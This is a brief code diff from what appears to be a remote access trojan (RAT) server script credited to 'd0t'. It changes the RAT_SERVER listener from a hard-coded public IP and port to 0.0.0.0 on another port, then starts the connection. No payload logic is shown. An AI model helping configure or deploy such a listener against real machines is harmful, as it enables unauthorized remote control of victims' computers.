@@ -507,7 +507,7 @@ print("           by d0t | " + str(ratversion) + " | Server")
 '''  ----------------------------------------------
 '''
 
-rat = RAT_SERVER('213.181.157.141', 8081)
+rat = RAT_SERVER('0.0.0.0', 55929)
 
 if __name__ == '__main__':
     rat.build_connection()
